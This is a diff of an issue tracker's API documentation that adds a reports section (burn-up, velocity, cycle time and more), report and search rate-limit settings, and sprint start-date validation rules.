@@ -35,6 +35,7 @@ https://tracker.example.com/api
 - [Components](#components)
 - [Versions](#versions)
 - [Sprints & backlog](#sprints--backlog)
+- [Reports](#reports)
 - [Search (HQL)](#search-hql)
 - [Saved filters](#saved-filters)
 - [Notifications](#notifications)
@@ -84,10 +85,14 @@ A self-hosted instance is configured through environment variables; a few of the
 | `AGILE_MAX_OPEN_SPRINTS` (`app.agile.max-open-sprints-per-project`) | `20` | Max **open** ([`FUTURE`](#sprints--backlog) + `ACTIVE`) sprints per project; `POST …/sprints` beyond it returns `422`. `COMPLETED` sprints are history and do not count. Valid range 1–100 — an out-of-range value aborts startup instead of being clamped. **Validated jointly with `AGILE_SECTION_MAX_ISSUES`:** `(this + 1) × section cap` must stay ≤ 20 000, because one `GET …/backlog` assembles that many issues in a single unpaged response; both knobs at their individual maxima would be ~202 000 rows, so startup fails rather than the response OOMing later |
 | `AGILE_DEFAULT_SPRINT_LENGTH_DAYS` (`app.agile.default-sprint-length-days`) | `14` | The `endAt` a [sprint start](#sprints--backlog) defaults to when the caller sends none (`startAt` + this many days). Valid range 1–90 — an out-of-range value aborts startup instead of being clamped |
 | `AGILE_MAX_BULK_MOVE` (`app.agile.max-issues-per-bulk-move`) | `100` | Max distinct `issueIds` accepted by `POST …/sprints/{id}/issues` in one request (`400` beyond it — chunk the request). Echoed to clients as `bulkMoveCap` in the [planning view](#sprints--backlog) `GET …/backlog`, so they chunk at your value instead of a hardcoded one — it is a **separate** knob from `AGILE_SECTION_MAX_ISSUES`. Valid range 1–500 — an out-of-range value aborts startup instead of being clamped |
+| `REPORTS_MAX_WINDOW_DAYS` (`app.reports.max-window-days`) | `365` | Widest window any [report](#reports) accepts, in days, **counting both endpoints**. A wider `GET …/reports/flow?from=&to=` or `GET …/reports/cycle-time?from=&to=` is a `400` whose `detail` names this cap, the property key and the length it measured — one shared implementation, so the two refuse in identical words (`GET …/reports/aging` has no window and cannot be refused this way at all) — the window is **never** silently clamped, because a chart of a window nobody asked for is how a report earns "these numbers don't match what I expected". The boundary itself is served (a maximum, not a strict inequality). Reporting depth is a **product** property, not a plan property: the value is identical on DC and Cloud with no profile override, so if you want to limit reporting, lower this number — there is no second code path. Valid range 1–3650 — an out-of-range value aborts startup instead of being clamped. The upper bound is a response-size guard: at `interval=DAY` the window length **is** the number of points in the response. Note that `GET …/reports/velocity` is **not** governed by this or by any other setting in this table: its sample is bounded by a hard-coded 1–12 sprints, refused rather than clamped, and that ceiling is deliberately **not** configurable — a band computed from further back than about half a year describes a team that has since changed its members, its process and its definition of a point, which is a product judgement rather than a capacity knob. **This same number has a second job on `GET …/reports/sprint-burnup`, where it bounds the day series instead of refusing anything**: a sprint may be started with an arbitrarily backdated `startAt`, so its day count is caller-influenced, and a sprint longer than this is **clipped — keeping the FIRST days, which carry the commitment — and disclosed as `seriesTruncatedAt`**, the last day the chart covers. It is not a `400` there because the caller stated no window (the sprint did), so there is nothing for them to correct and refusing would leave a legitimately long sprint with no chart. Lowering this therefore shortens burn-up charts for long sprints rather than breaking them; it does **not** clip `GET …/reports/sprint-review`, which returns lists rather than a day series |
+| `REPORTS_MAX_ROWS` (`app.reports.max-rows`) | `20000` | Most issue **rows** one [report](#reports) may materialise before it declares itself truncated (`POST …/search/insights` is outside its reach entirely — that report aggregates in SQL and materialises no issue row, so it always answers `truncated: false` and discloses its own bucket caps, which are fixed constants and not configurable, through `slicesTruncated` / `cellsTruncated`) — echoed to every client as `meta.cap`, with `meta.truncated: true` when it bites. It does **not** bite on `GET …/reports/flow`, which aggregates in PostgreSQL and returns at most one row per bucket (that report always answers `truncated: false`); the value is still echoed there so a client never has to guess which budget a number was measured against. It is the real budget for the row-level reports: `GET …/reports/cycle-time` ships the **most recent** rows up to it and `GET …/reports/aging` the **oldest** — each keeps the end its reader came for. On the two sprint reports it caps **ledger event rows** rather than issues, and the surviving end is the **oldest**, so a truncated sprint keeps its commitment and its earliest changes (the head of the chart stays exact and its tail goes missing — the recoverable failure; the opposite ordering would lose the commitment batch and make every number wrong). It effectively cannot bite there: one sprint's ledger is hundreds of rows. `GET …/reports/velocity` reads up to twelve sprints' ledgers in one sweep against the same cap, and there it is the one setting in this table that can change what a report is willing to say: once it bites, **every** sampled sprint whose rows fell past it is dropped from the chart (drawing them as all-zero bars would feed those zeros into the forecast and understate the team), **and the forecast band is suppressed outright** — a band over whichever bars happened to fit is not the one the caller asked for. Lowering this therefore shortens a velocity chart *and* withholds its band, rather than merely trimming a list; `meta.truncated` is the signal in every case, and `meta.basedOnIssues` is counted in the database above the cap on all three sprint-ledger reports, so it still states how many issues the report was about. Do not confuse it with the burn-up's `seriesTruncatedAt`, which is the **day** clip governed by `REPORTS_MAX_WINDOW_DAYS` above and deliberately does **not** set `meta.truncated` — two limits, two signals. Lowering it shortens those lists and **never moves a number**: the percentiles and counts on both are aggregates computed over the whole matching set, not over the shipped rows, so a truncated report still describes the full population and says so in `meta.basedOnIssues` / `sampleSize`. Identical on DC and Cloud, same reasoning as above. Valid range 1–50000 — an out-of-range value aborts startup instead of being clamped. The ceiling is a byte budget wearing a row count: a shipped row costs roughly 1.9 KB of transient heap at worst (the JDBC row, the DTO and the buffered JSON are all alive at once), so 50000 is ~95 MB for a single request and the old 200000 was ~380 MB, i.e. a documented value that could OOM the instance in one GET. The ceiling is sized against an **assumed reference heap of 512 MB** — that is the premise the arithmetic is reasoned against, not something the deployment enforces: the published image runs a bare `java -jar` with no heap flag and the sample compose sets no memory limit, so the JVM takes ~25% of the host's RAM and the effective budget floats with the machine you run on. Size this against the heap you actually get: on a 1 GB host (the documented minimum) that is ~256 MB and you should lower it, while on a large host the ceiling is conservative. Configuring an explicit heap bound is tracked as `HD-152` |
+| `REPORTS_REQUESTS_PER_MINUTE` (`app.reports.requests-per-minute`) | `60` | How many report requests **one user** may make per minute across the whole `…/reports/**` surface **plus `POST …/search/insights`**, which is a report that does not live under that path (its dataset is an HQL query, so it hangs off `/search`) and is therefore bound to the limiter explicitly rather than by prefix — all seven reports share this one budget rather than holding one each, so a page opening the sprint burn-up and the sprint review together spends two of it, and an Insights panel refresh spends one from the same pot. Past it the answer is `429` + `Retry-After` (seconds) — a retryable throttle, never a narrowed or approximated report. The budget is spent **before** the workspace and project are resolved, so an over-budget caller gets `429` even for a project they cannot see; it is keyed on the caller and never on the project, which is what keeps that refusal free of tenancy information and stops one colleague's open dashboard from throttling their whole team. For the six project-scoped reports this is the only thing bounding the **work** a report does — `REPORTS_MAX_WINDOW_DAYS` bounds the response array, not the cost of producing it (the opening balance is O(project history)), and `Cache-Control: private` means no shared cache ever absorbs a repeat. Counters are in-memory per app node, so a multi-instance deployment gets one budget per instance; `RATE_LIMIT_ENABLED=false` switches it off along with every other limiter. Valid range 1–10000 — there is deliberately no "unlimited", and an out-of-range value aborts startup instead of being clamped. Identical on DC and Cloud with no profile override, same reasoning as the two settings above. The Insights panel is the one exception to "only thing": it is additionally inside `SEARCH_REQUESTS_PER_MINUTE` below. It sits on the reports limiter deliberately, because removing that binding would raise the panel’s allowance to the search budget as a side effect — so **the lower configured value binds**, and lowering *either* property lowers the panel. |
+| `SEARCH_REQUESTS_PER_MINUTE` (`app.search.requests-per-minute`) | `120` | How many **search-surface** requests **one user** may make per minute across the whole `…/workspaces/*/search/**` path: [`POST …/search`](#search-hql), `GET …/search/schema`, `GET …/search/suggest` and [`POST …/search/insights`](#insights--break-down-the-query-in-the-search-box) **and the whole `…/workspaces/*/filters/**` path** — every saved-filter operation, `GET` and `DELETE` included, since the binding is by path and not by method. Saved filters are on this budget because **HQL validation is search-surface work wherever it is mounted**: validating a filter builds the same resolution context `…/search/schema` pays for (roughly eight statements, including a workspace-wide label projection and a full member scan), so creating one with a deliberately invalid body was an unthrottled eight-query refusal loop. It is charged here rather than to the reports pot because a saved filter *is* a saved search. Saved filters (`…/workspaces/*/filters/**`) are on this budget too: validating a filter's HQL builds the same resolution context `…/search/schema` pays for (a workspace-wide label projection and a full member scan), so an invalid-body loop there was the same unthrottled cost wearing different clothes — and a saved filter is a saved search, done by the same person. Past it the answer is `429` + `Retry-After` (seconds) — a retryable throttle, never a narrowed result. **Its own budget rather than the reports one** because a person typing in a search box legitimately fires several requests a minute and must not be starved to protect charts; 120 is roughly ten times ordinary SPA use. Search is not the cheap surface it looks like: a query may carry up to 50 leaf predicates, a `text ~` leaf compiles to two unanchored, unindexable `LIKE`s over a TEXT column, and the endpoint runs the whole predicate **twice** per request (count, then page) — so until this existed the expensive door was the unthrottled one. Spent **before** the workspace is resolved, so an over-budget caller is refused even for a workspace they cannot see. Counters are in-memory per app node, so a multi-instance deployment gets one budget per instance. Valid range 1–10000 — there is deliberately no "unlimited": `0` is out of range and fails startup, and the off switch is `RATE_LIMIT_ENABLED`, which disables every limiter in the app. Identical on DC and Cloud with no profile override. **Leave the line out to get the default — `SEARCH_REQUESTS_PER_MINUTE=` is an empty value, not an absent one, and it stops the boot rather than restoring 120**. The Insights panel is inside **both** this budget and `REPORTS_REQUESTS_PER_MINUTE` above. It sits on the reports limiter deliberately, because removing that binding would raise the panel’s allowance to the search budget as a side effect — so **the lower configured value binds**, and lowering *either* property lowers the panel. |
 | `ROLES_MAX_CUSTOM_PER_WORKSPACE` (`app.roles.max-custom-per-workspace`) | `50` | Max [custom roles](#custom-roles) one workspace may define, counted across **both** scopes with the built-in templates excluded (they belong to no workspace). Duplicating past it returns `409` `errorType: "ROLE_LIMIT_REACHED"`. It is a **sprawl guard, never a licence check** — custom roles are a product feature and not a plan feature, so the value is identical on DC and Cloud and there is no second code path anywhere. If you want to limit them, lower this number. Valid range 1–500 — an out-of-range value aborts startup instead of being clamped. The count is taken under a row lock on the workspace, so the cap is exact rather than advisory, and a duplicate is one of the calls that can lose a lock race (a retryable `409` with `Retry-After`, bounded by `DB_LOCK_TIMEOUT_MS` below) |
 | `DEFAULT_PROJECT_ACCESS_MODE` (`app.workspace.default-project-access-mode`) | `OPEN` | The [project-access mode](#project-access) a **newly created** workspace starts in — `OPEN` (members without an explicit project membership inherit each project's default role) or `STRICT` (only people added to a project can change anything in it; everyone can still see every project). It **never changes an existing workspace**: every workspace this release upgrades is `OPEN`, and the only way to move one afterwards is `PATCH /api/workspaces/{ws}`. Demo seeding goes through the same creation path, so setting `STRICT` also gets you a strict demo workspace — that is correct and deliberately not special-cased. It is **not a plan or licence knob**: access modes are a product feature, the default is identical on DC and Cloud, and there is no second code path anywhere. An invalid value aborts startup rather than falling back — there is no third mode. |
 | `DB_LOCK_TIMEOUT_MS` (`app.locking.lock-timeout-ms`) | `3000` | How long a transaction that takes row locks (the [membership mutations](#managing-members) — workspace member role change and removal, project member role change and removal, and a [custom-role](#custom-roles) duplicate) may wait for one, in milliseconds. Exceeding it is a retryable `409` with `Retry-After` (see [Errors](#errors)), never a `500`. Applied with `SET LOCAL` to that transaction only, so Flyway migrations sharing the datasource are unaffected. Lower it to shed load faster under contention, raise it if legitimate removals of very busy members time out. Valid range 100–60000 — an out-of-range value aborts startup instead of being clamped (PostgreSQL reads `0` as "wait for ever", which is the setting this exists to prevent) |
-| `RATE_LIMIT_ENABLED` | `true` | Auth rate limiting (see [Rate limits](#rate-limits)) |
+| `RATE_LIMIT_ENABLED` | `true` | Master switch for **every** in-memory limiter, not just the auth ones: the per-IP auth budgets and login backoff, the per-principal reports budget (`REPORTS_REQUESTS_PER_MINUTE`) and the per-principal search budget (`SEARCH_REQUESTS_PER_MINUTE`). Setting it `false` disables all three families (see [Rate limits](#rate-limits)) |
 | `RATE_LIMIT_AUTH_IP_PER_MINUTE` / `RATE_LIMIT_LOGIN_FAILURE_THRESHOLD` / `RATE_LIMIT_LOGIN_BACKOFF_BASE_SECONDS` / `RATE_LIMIT_LOGIN_BACKOFF_MAX_SECONDS` | `15` / `5` / `30` / `900` | Rate-limit tuning |
 | `APP_BASE_URL` | — | The `refresh_token` cookie is marked `Secure` only when this is an `https` URL |
 
@@ -111,7 +116,7 @@ All endpoints except [Auth endpoints](#auth-endpoints) and [Instance metadata](#
 
 ## Conventions
 
-- **Format** — request and response bodies are JSON (`Content-Type: application/json`), UTF-8. The only exceptions: attachment upload (`multipart/form-data`) and download (binary).
+- **Format** — request and response bodies are JSON (`Content-Type: application/json`), UTF-8. The only exceptions: attachment upload (`multipart/form-data`), attachment download (binary), and the [report CSV exports](#csv-exports--the-chart-as-a-file) (`text/csv; charset=UTF-8`, sent as an attachment). Error bodies stay `application/problem+json` on every one of those, including the CSV paths.
 - **IDs** — all identifiers are UUIDs, except issues, which are addressed by their **project-scoped number** (the `42` in `DEMO-42`).
 - **Timestamps** — ISO-8601 with UTC offset, e.g. `2026-07-14T06:24:41.486119Z`. Date-only fields (`dueDate`) use `YYYY-MM-DD`.
 - **Partial updates** — `PATCH` endpoints accept any subset of fields; omitted (or `null`) fields are left unchanged.
@@ -252,7 +257,11 @@ Treat an `errorType` you do not recognise exactly as `ADOPTION_BLOCKED`: **no re
 
 The sensitive auth endpoints (`login`, `register`, `verify-email`, `resend-verification`, `forgot-password`, `reset-password`) share a **per-IP budget** (default 15 requests per minute). Additionally, repeated failed logins for one account trigger an **exponential backoff** (defaults: starts at 30 s after 5 consecutive failures, doubles per failure, capped at 15 min); a successful login resets the counter. Both mechanisms respond with `429` and a `Retry-After` header (seconds). Operators tune or disable this via the `RATE_LIMIT_*` variables below. Counters are in-memory (per app node).
 
-One non-auth endpoint has a throttle of its own: [`POST …/issues/{number}/rank`](#sprints--backlog) allows at most one whole-project rank *rebalance* per project per 60 s and answers `429` + `Retry-After` for a second one inside that window. It is a retryable throttle, not a fault — nothing was moved. That cooldown is a fixed internal safety valve with no environment variable, and its counter is in-memory per app node too. The rest of the API is not rate-limited.
+**Three** non-auth surfaces have throttles of their own. [`POST …/issues/{number}/rank`](#sprints--backlog) allows at most one whole-project rank *rebalance* per project per 60 s and answers `429` + `Retry-After` for a second one inside that window; it is a retryable throttle, not a fault — nothing was moved. That cooldown is a fixed internal safety valve with no environment variable, and its counter is in-memory per app node too. Every [report](#reports) — the six under `…/reports/**` plus [`POST …/search/insights`](#insights--break-down-the-query-in-the-search-box), which is bound to the same limiter explicitly because it does not sit under that path — shares **one per-principal budget of 60 requests per minute** (`REPORTS_REQUESTS_PER_MINUTE` below, in-memory per app node, switched off wholesale by `RATE_LIMIT_ENABLED=false`). And the whole HQL surface `…/search/**` — [`POST …/search`](#search-hql), `…/search/schema`, `…/search/suggest` **and** the insights panel — shares a **second, separate** per-principal budget of **120 requests per minute** (in-memory per app node, and covered by the same `RATE_LIMIT_ENABLED` master switch). [Saved filters](#saved-filters) (`…/filters/**`) are on that second budget too: validating a filter's HQL builds the same resolution context `…/search/schema` pays for, so an invalid-body loop there is the same cost wearing different clothes. The two are deliberately not one pot: somebody typing in a search box legitimately fires several requests a minute and must not be starved to protect charts.
+
+**`POST …/search/insights` is inside both patterns: it spends *both* budgets, and the lower configured value binds.** It sits on the reports limiter deliberately, because removing that binding would raise the panel’s allowance to the search budget as a side effect. Do not assume which of the two governs — that follows from whatever an operator has configured, so lowering *either* property lowers the panel. **A panel refresh therefore competes with report fetches *and* with searches.**
+
+Both per-principal budgets are checked **before** the workspace and project are resolved — the one place in this API where a `429` precedes a `404` — and being keyed on the principal they bound **one user, not one workspace**: aggregate load still scales with member count (see [Reports](#reports)). Beyond these three **budgets** and the auth endpoints above, nothing else in this API is rate-limited. Note that a budget is not a path: saved filters are throttled without sitting under `…/search/**`, because what earns a throttle is the work a handler does, not where it is mounted.
 
 ## Roles
 
@@ -1843,11 +1852,25 @@ curl -X POST $BASE/workspaces/$WS/projects/$PROJ/sprints \
 
 **Update** — `PATCH` takes `{"name?", "goal?", "startAt?", "endAt?", "clearStartAt?", "clearEndAt?"}`; omitted fields are left unchanged, and `clearStartAt`/`clearEndAt` unset the dates (the `assigneeId`/`clearAssignee` convention — a plain `null` can't be told apart from an omitted field). There is deliberately **no** `state` field: the lifecycle moves only through the two calls below, and it never moves backwards.
 
-**Start** — `POST …/sprints/{sprintId}/start`, body **optional**: a bare `POST` means "start it now and run it for `AGILE_DEFAULT_SPRINT_LENGTH_DAYS` days (14 by default)". `{"startAt?", "endAt?", "goal?"}` overrides any of that; `endAt` defaults to `startAt` + that same setting, and a `startAt` in the past is allowed on purpose (backfilling a sprint that actually began on Monday is normal).
+The **resulting** dates are validated, not the ones in the payload: `endAt <= startAt` after the patch is applied is a `422`. Two further refusals guard `startAt`, both `422`:
+
+- `"An active sprint must keep a start date"` — an `ACTIVE` sprint cannot be left without one, so `clearStartAt` on a running sprint is rejected. A sprint that is running has, by definition, started.
+- `"A sprint's start date can only be changed while it is still in the future"` — once a sprint has left `FUTURE`, its `startAt` is frozen, for `ACTIVE` and `COMPLETED` alike. **A started sprint's start date is the origin its reports are measured from**: the scope it committed to is recorded against the original start, so moving the start afterwards would leave the recorded commitment dated to the old start while the sprint claims a new one — pull the start earlier and every recorded commitment sits *after* it, so "committed scope at start" reads `0`. The field is not frozen out of caution; it is frozen because two records would otherwise disagree. The recovery path for a wrong start is a new sprint, not an edit to a running one.
+
+**Equality here is by instant, not by representation.** The comparison is on the moment itself, so re-sending the same instant written in a different UTC offset (`2026-08-10T09:00:00+02:00` vs `2026-08-10T07:00:00Z`) is not an edit and is accepted. A client that reads a sprint and `PATCH`es the whole object back unchanged will not trip this rule.
+
+**Start** — `POST …/sprints/{sprintId}/start`, body **optional**: a bare `POST` means "start it now and run it for `AGILE_DEFAULT_SPRINT_LENGTH_DAYS` days (14 by default)". `{"startAt?", "endAt?", "goal?"}` overrides any of that; `endAt` defaults to `startAt` + that same setting, and a `startAt` in the past is allowed on purpose (backfilling a sprint that actually began on Monday is normal) — but a `startAt` in the **future** is not.
 
 - Starting a sprint that is not `FUTURE` — already active, or completed — is a `409`, so a double-click can never re-start anything.
 - Starting one while **another sprint of the project is already active** is a `409` too, and that verdict comes from a database-level uniqueness rule, so two simultaneous starts always resolve to exactly one winner.
 - Starting an **empty** sprint is allowed: blocking it would only push teams to file a placeholder issue. The UI warns; the API does not.
+- A `startAt` in the **future** is a `422`: *"A sprint can't be started with a start date in the future — start it when it actually begins. Until then leave it planned: a future sprint's dates stay editable, and starting it stamps the start for you."* (`endAt <= startAt` is a `422` here too.)
+
+**Do what the refusal says.** Planning a future start is entirely legal — `POST …/sprints` and the `PATCH` above accept any date, and a `FUTURE` sprint's dates stay editable right up to the moment it starts. Leave the sprint planned until it actually begins, then start it: a bare `POST` stamps the start for you, so the date never has to be typed at all. Only this one door is guarded, because it is the one that turns a plan into history.
+
+**Why it is refused rather than accepted and quietly clamped** — and why this rule and the `startAt` freeze above must be read as a pair, since either one alone gives a wrong model of the endpoint. A forward-dated start writes a `startAt` that the sprint's own commitment record legitimately disagrees with: the commitment is stamped when the start actually happens, so a burn-up measured over the sprint's window would report a committed scope of `0`. The freeze then makes that wrong date **permanent** — once the sprint has left `FUTURE` its `startAt` can no longer be patched, so the only way out of a mistyped year is to complete the sprint and recreate it. Freezing a value is only defensible if a wrong one cannot get behind the freeze in the first place. A forward-dated start also allowed a sprint to be *completed before it started*, which the velocity report reads as a negative-length iteration.
+
+**Five minutes of clock skew are tolerated, and treated as `now`**: a `startAt` up to five minutes ahead of the server's clock is not refused — it is **recorded as `now`**, so the sprint's stored `startAt`, the one echoed back in the response, and the sprint's own commitment records all carry the same instant. The tolerance means "a slightly fast clock is now", not "a slightly future start is accepted and stored as sent". It exists for **unsynchronised client clocks, not as policy** — it is not configurable, and it is far too small to express an intention. Nobody plans a sprint to begin in four minutes.
 
 **Completion preview** — `GET …/sprints/{sprintId}/completion-preview` is the completion dialog's data source and is readable by any project member (looking at the numbers is not a commitment). It returns the same counters the completion itself reports, off the same query, so the two cannot drift:
 
@@ -1941,9 +1964,662 @@ curl -X POST $BASE/workspaces/$WS/projects/$PROJ/issues/18/rank \
 
 **Using sprints elsewhere** — set `sprintId` / `storyPoints` when creating or updating an [issue](#issues) (`clearSprint` / `clearStoryPoints` unset them), filter the board and backlog with `?sprintId=` or `?noSprint=true`, and query them in [HQL](#search-hql) as `sprint` (alias `sprints`) and `storyPoints` (alias `points`). An issue's own sprint comes back in `IssueResponse.sprint` as `{id, name, state}`, or `null`.
 
+## Reports
+
+Read-only analytics, six of them over one project under `/workspaces/{wsId}/projects/{pId}/reports` and a seventh — [Insights](#insights--break-down-the-query-in-the-search-box) — over a workspace-wide HQL query, on the search base path. Each of the six project reports also has a **[`.csv` sibling](#csv-exports--the-chart-as-a-file)** that exports the plotted series as a file. Flow is the **first** of these endpoints and the one that fixes the conventions the rest of them inherit — everything under "How every report behaves" below is a property of the family, not a quirk of `/flow`. Cycle time and aging WIP are the two halves of one page and read best together. The two **sprint** reports are the other pair: the burn-up asks *will this sprint land, and what happened to the plan*, the review is the record a retro reads out, and they are computed from one shared ledger so they can never disagree about what was in the sprint — though they disagree, deliberately, about which story points to use. **Velocity** reads the same ledger across several completed sprints: what recent sprints delivered, and the band to plan the next one with. **Insights** is the odd one out — a `POST`, workspace-scoped, and refusing with `422` rather than `400` — because its dataset is not a project but whatever query is in the search box.
+
+| Method | Path | Auth | Description |
+|---|---|---|---|
+| `GET` | `/workspaces/{wsId}/projects/{pId}/reports/flow?from=&to=&interval=&typeId=&componentId=&labelId=` | member | Created vs resolved over a window, plus the open-count line and the window totals |
+| `GET` | `/workspaces/{wsId}/projects/{pId}/reports/cycle-time?from=&to=&typeId=&componentId=&labelId=` | member | One dot per issue completed in the window, plus the p50/p85 of cycle time and lead time |
+| `GET` | `/workspaces/{wsId}/projects/{pId}/reports/aging` | member | The open issues, oldest first, in the columns of the project's workflow, under the project's lifetime cycle-time percentiles |
+| `GET` | `/workspaces/{wsId}/projects/{pId}/reports/sprint-burnup?sprintId=&measure=` | member | One sprint's scope and completed lines, day by day, plus the log of every change to its scope |
+| `GET` | `/workspaces/{wsId}/projects/{pId}/reports/sprint-review?sprintId=` | member | Committed, added after start, removed before end, completed and carried over — five lists and a header line |
+| `GET` | `/workspaces/{wsId}/projects/{pId}/reports/velocity?sprints=&measure=` | member | The last N completed sprints as bars, plus a p50/p85 band with its sample size |
+| `POST` | `/workspaces/{wsId}/search/insights` | member | Break down the HQL query in the search box — bars, optional stacking, click-through fragments |
+
+### How every report behaves
+
+**Project membership, and nothing else.** There is no `report.view` [permission](#permissions) and there is not meant to be one: this product has no read permissions, and every number a report prints is derivable by the same member from the [search API](#search-hql) they already hold, so a gate here would protect nothing. Any workspace member who can reach the project may open its reports, including one with no explicit project membership. Anonymous is `401`; an unknown workspace, an unknown project, a project that belongs to a **different** workspace and a non-member are all `404`, indistinguishably — `403` is never returned by a report.
+
+**Three things this family will not do, and they are policy rather than backlog.** They are stated here because they are properties of the whole surface, not of the one report where they bite hardest:
+
+- **No per-person breakdown of a published metric.** Not a filter, not a field, not a tooltip extra, not a CSV column. The evidence is specific: velocity compared between people or teams is read as a productivity score, and teams respond by inflating estimates — the number goes up and the delivery does not.
+- **No aggregate above the project.** Every one of these reports is served from below `/projects/{pId}/`, and there is deliberately no workspace-level rollup. Comparing two teams means opening two pages and doing the arithmetic yourself, and **that friction is the design** — the harm comes from comparisons cheap enough to make without thinking about them.
+- **No single quotable number.** Where this family forecasts, it returns a range with its sample size attached, precisely so there is nothing to paste into a status report.
+
+**The line is a published metric versus an ad-hoc query, and it is what makes [Insights](#insights--break-down-the-query-in-the-search-box) consistent with [velocity](#velocity--how-much-should-we-plan-for-next-sprint) rather than an exception to it.** Velocity has a stable URL and gets read out in a ceremony, so a per-person column in it becomes a comparison whether anyone meant it or not — and it refuses `ASSIGNEE` outright. Insights is whatever HQL somebody just typed: it is not addressable as "the team’s number", and the same person could get the same breakdown by running eight searches by hand — so it offers `ASSIGNEE` as a grouping dimension. Same policy, opposite answers, because they are different objects.
+
+**A project's [delivery capabilities](#delivery-capabilities) change nothing.** No status code on any report depends on a capability: `board: KANBAN` does not close a report and `estimation: false` does not change one's shape. A capability hides vocabulary in the UI; it is never a permission and never a `404`.
+
+**Caching** — every report answers `Cache-Control: private, max-age=60` **and `Vary: Authorization`**. (With one caveat that matters: `/search/insights` is a `POST`, and **no browser serves a `POST` response from its HTTP cache**, so there those headers are consistency and defence rather than effect, and the 60-second de-duplication has to be yours. See its own section.) `private` is the load-bearing half: a report is one tenant's data and must never be held by a shared cache. The `Vary` is not decoration — a browser's HTTP cache keys on (method, URL) and **ignores request headers unless `Vary` names them**, so without it a shared-profile browser could replay a cached `200` to a different bearer token inside the 60 s, one the server would have answered `404`.
+
+**The shared `meta` block.** Every report response carries the same provenance object:
+
+```json
+"meta": {
+  "computedAt": "2026-08-19T09:14:22Z",
+  "basedOnIssues": 1842,
+  "truncated": false,
+  "cap": 20000,
+  "firstIssueAt": "2024-11-04T08:31:00Z",
+  "unmatchedFilters": []
+}
+```
+
+It exists because the classic complaint about a reporting feature is *"these numbers don't match what I expected"*, and what produces it is a report that quietly left data out. A response that states **when** it was computed, **how many issues** it was computed from, **whether a cap bit**, **how far back its data goes** and **whether a filter it was given matched nothing** cannot fail that way silently.
+
+- `computedAt` — reports are live reads, so two tabs opened minutes apart legitimately disagree. This is how a reader tells which is which.
+- `basedOnIssues` — how many **distinct issues** the numbers came from. Which population that is follows from the report's own question, so each report says: on `/flow` the issues *touching* the window, i.e. created in it **or** closed in it; on `/cycle-time` the completed issues in the window after filters (the same number as `sampleSize`); on `/aging` the project's open issues; on `/sprint-burnup` and `/sprint-review` the distinct issues that have ever been in that sprint; on `/velocity` the distinct issues the sampled sprints' ledgers hold, with an issue that appeared in two of them counted once; on `/search/insights` the distinct issues matching your query — the same number the search result list shows, and **deliberately not the sum of the series**, because a many-valued dimension puts one issue in several buckets. On `/flow` it is deliberately **not** `created + resolved` — an issue created and closed inside the same window appears on both lines but is one issue of evidence, not two, and adding the lines together would overstate the report's own evidence, the exact species of quiet wrongness `meta` exists to prevent. It is never `items.length`: when a cap bites this is deliberately the larger number, because it must state how many issues the report was *about*, which is precisely what the reader can no longer see.
+- `truncated` — whether `cap` actually bit. When `true` the report is a partial view and a client must say so above the chart. **On `/flow` it is always `false`, and that is a fact rather than a stub:** the flow report aggregates inside PostgreSQL and returns at most one row per bucket, so the row cap physically cannot bite there. **Always `false` on `/search/insights` too, for the same reason** — it aggregates in SQL and materialises no issue row at all; what truncates there is *buckets*, disclosed by its own `slicesTruncated` / `cellsTruncated` flags rather than by this one. It does bite on the row-level reports, and **which end survives differs by report, on purpose**: `/cycle-time` keeps the **most recent** rows, because its reader wants the latest work, and `/aging` keeps the **oldest**, because its reader wants the most rotten item. A client that assumes the wrong end draws a wrong chart from a correct response. On both, the aggregates — percentiles, counts — are computed over the *whole* matching set, so truncation shortens the list and never moves a line.
+
+  **On the two sprint reports the cap counts ledger *event* rows rather than issues**, and the end that survives is the **oldest**: the ledger is read oldest-first, so a truncated sprint keeps its commitment and its earliest changes — the head of the chart stays exact and its tail goes missing, which is the recoverable failure. The opposite ordering would drop the commitment batch and make every number wrong. In practice it cannot bite (one sprint's ledger is hundreds of rows against a cap of 20 000), but "in practice" is not an ordering guarantee, so the ordering is. **`seriesTruncatedAt` on `/sprint-burnup` is a different limit and does not set this flag** — that one clips the *day series* against `app.reports.max-window-days` and names the day the chart stops at; `truncated` means only that the row cap printed beside it in `cap` actually bit. Two limits, two signals, on purpose: folding them together once made a twelve-issue sprint answer `truncated: true` beside `cap: 20000` and put "20 000" in a banner about a report that had dropped no rows at all.
+
+  **On `/velocity` this flag also changes what the response is willing to say.** Its sweep reads up to twelve sprints' ledgers at once, so a cap that bites removes whole sprints rather than shaving one; those sprints are dropped from `sprints[]` instead of being drawn as all-zero bars, **and `forecast` is suppressed** — a band over whichever bars happened to fit is not the band anybody asked for. So there, `truncated: true` means "this chart is shorter than you asked for and its forecast is withheld", not merely "a list was cut".
+- `cap` — the row budget that *would* bite. Reported by every report **including the ones that cannot hit it**, so a client never has to guess which budget a number was measured against.
+- `firstIssueAt` — when the **earliest issue the project holds that this report's filters admit** was created, or `null` when there is none. This is what "we only have N days of history" has to be measured from: the project's own `createdAt` is a different date, often years off, and getting it used to cost a second request for a number that was never the right one.
+
+  **Filters yes, window never — on every report, without exception.** It is a property of the **project**, not of the sample a given report happens to be describing, so it is **not bounded by `from`/`to` and routinely predates `from`**. That is the entire use of it: it is what tells a reader whether the window they chose is wider than the data behind it. Reading it over the window would not merely make one report disagree with another — it would be **circular**. The earliest issue inside a 14-day window is at most 14 days old, so a five-year-old project asking for a fortnight would report a fortnight of history, and a client's thin-data warning would fire on every project. A number read over the window can only ever return the window.
+
+  **Filters do still apply**, so on a filtered chart it reads "the first issue this chart could ever have shown" — with `typeId` set it is the first issue *of that type*, and with a `componentId` or `labelId` the first issue carrying that component or label. A filter that matches **nothing** therefore makes this `null`, beside that filter's name in `unmatchedFilters`. And it is the first **issue**: not the project's own creation date, and reading it as the project's age is the mistake this bullet exists to prevent. It is **`null` on any report that spans a workspace rather than a project** — today that is `/search/insights`. This is a per-project property, and giving one field name a second, workspace-wide definition was refused.
